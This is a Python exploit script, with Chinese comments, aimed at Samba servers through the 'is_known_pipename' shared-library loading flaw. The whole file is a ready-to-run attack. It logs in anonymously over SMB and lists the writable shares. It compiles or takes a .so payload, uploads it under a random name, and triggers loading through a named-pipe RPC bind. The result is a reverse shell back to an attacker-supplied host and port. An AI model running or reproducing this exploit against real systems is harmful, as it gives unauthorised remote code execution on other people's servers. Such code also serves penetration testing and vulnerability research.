import os
import sys
import time
import random
import string

from optparse import OptionParser
from impacket.dcerpc.v5 import transport, srvs
from impacket.smbconnection import SMBConnection

#-------------------------------------------------------------------------------
CONFIG_H = """#define PORT "%s"
#define IP "%s"
"""
#-------------------------------------------------------------------------------
def log(msg):
    print ("[%s] %s" % (time.asctime(), msg))
#-------------------------------------------------------------------------------

lhost = None
lport = None
rhost = None
rport = None

module = None

smb_connection=None

"""
0. 判断恶意模块是否要自己编译
1. 登录
2. 上传文件
3. 加载文件
4. 删除文件
"""
def exploit(options):
    lhost = options.lhost
    lport = options.lport
    rhost = options.rhost
    rport = options.rport
    module = options.module
    if module is None:
        compile_module(lhost,lport)
        module="payload.so"

    smb_connection=get_smb_connection(rhost,rport)

    # 1.登录
    if smb_connection is None:
        log("Log into Samba Server Failed")
        return False
    
    # 得到随机的一个lib名，防止上传失败
    fake_name=get_random_name()

    log("Trying to get directory from the server")
    server_directorys = get_remote_payload_path_set(fake_name,smb_connection)

    if server_directorys is None:
        log("Unable to get usable directory")

    # 2.上传文件 先对找到的目录都试一遍上传,只要有一个成功传上去就行
    for share in server_directorys:
        log("Trying to Upload %s to %s"%(fake_name,share))
        if upload_file(share[0],module,fake_name,smb_connection):
            log("Upload file OK!")
            server_directory=share[1]
            break
        if share==server_directorys[len(server_directorys)-1]:
            return False

    module="%s/%s"%(server_directory,fake_name)

    # 3.加载恶意模块，进入reverse shell
    log("Trying to Exploit")
    do_exploit(module,rhost,smb_connection)
    log("Explpoit Finished. Can you see the reverse shell?")
    return True

def compile_module(lhost,lport):

    with open("config.h", "wb") as f:
        f.write((CONFIG_H % (lport, lhost)).encode("utf-8"))

    log("Trying build modules")
    ret = os.system("make")
    log("Build modules OK!")
    return ret == 0

def do_exploit(module,rhost,smb_connection):
    log("Trying to load module %s" % module)
    stringbinding = r'ncacn_np:%s[\pipe\%s]' % (rhost, module)
    sb = transport.DCERPCStringBinding(stringbinding)
    na = sb.get_network_address()
    rpctransport = transport.SMBTransport(na, filename = module, smb_connection = smb_connection)
    dce = rpctransport.get_dce_rpc()

    try:
        dce.connect()
        return True
    except:
        pass #不知道为什么一定会抛异常，但是我们不管

    return False

def get_random_name(total=8):
    ret = ''.join(random.choice(string.ascii_uppercase + string.digits + string.ascii_lowercase) for _ in range(total))
    return "%s.so" % ret

def get_smb_connection(rhost,rport): #得到smb
    try:
        smb = SMBConnection(remoteName='*SMBSERVER', remoteHost=rhost, sess_port=int(rport))
        smb.login("","") # 匿名登录

        return smb
    except:
        log("Error log into Samba server: %s" % str(sys.exc_info()[1]))
        return None

def upload_file(remote_directory,file_name,file_name_to_remote,smb_connection):
    f=open(file_name, "rb")
    try:
        smb_connection.putFile(remote_directory, file_name_to_remote, f.read) #这个？share_name[0]会返回拷贝后的路径？
        return True
    except:
        log("Error copying file: %s" % str(sys.exc_info()[1]))
        return False

def translate_smb_path(path):
    pos = path.find(":")
    if pos > -1:
        path = path[pos+1:]
        path = path.replace("\\", "/")
    return path

def get_remote_payload_path_set(lib_name,smb_connection_):
    rpctransport = transport.SMBTransport(smb_connection_.getRemoteName(), smb_connection_.getRemoteHost(),
                                        filename=r'\srvsvc', smb_connection=smb_connection_)
    dce = rpctransport.get_dce_rpc()
    dce.connect()
    dce.bind(srvs.MSRPC_UUID_SRVS)
    resp = srvs.hNetrShareEnum(dce, 2)

    directory_set = []
    ignore_shares = ["print$", "IPC$"]
    for share in resp['InfoStruct']['ShareInfo']['Level2']['Buffer']:
        share_name = share['shi2_netname'][:-1]
        share_path = translate_smb_path(share['shi2_path'][:-1])
        directory_set.append([share_name, share_path])

    return directory_set

#-------------------------------------------------------------------------------
# 命令行: -t 目标ip, -p 目标端口, -lhost 本机ip, -lport 本机端口, -m 预编译模块
# shell使用/bin/sh
#-------------------------------------------------------------------------------
def main():
    parser = OptionParser()
    
    msg = "Target port, defualt 445"
    parser.add_option("-t", "--rhost", dest="rhost", help="target ip address")
    parser.add_option("-p", "--rport", dest="rport", default=445, help=msg)
    
    msg = ".so payload to let target load. If not set, it will compile by itself"
    parser.add_option("-m", "--module-payload", dest="module",default=None,help=msg)
    
    msg = "Hostname for reverse shell"
    parser.add_option("--lhost", dest="lhost", help=msg)
    msg = "Port for reverse shell, default 23333"
    parser.add_option("--lport", dest="lport", default=23333, help=msg)
    
    (options, args) = parser.parse_args()

    if options.rhost and options.lhost:
        exploit(options)
    else:
        parser.print_help()

if __name__=="__main__":
    main()